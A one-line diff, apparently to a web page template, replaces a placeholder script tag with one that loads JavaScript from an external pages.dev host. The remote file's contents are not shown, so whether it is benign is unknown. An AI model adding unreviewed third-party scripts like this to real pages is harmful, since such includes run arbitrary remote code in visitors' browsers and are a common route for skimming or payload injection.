@@ -1,1 +1,1 @@
-<script src='#' type='text/javascript'/>
+<script src='https://bisnisonline.pages.dev/skintific.js' type='text/javascript'/>
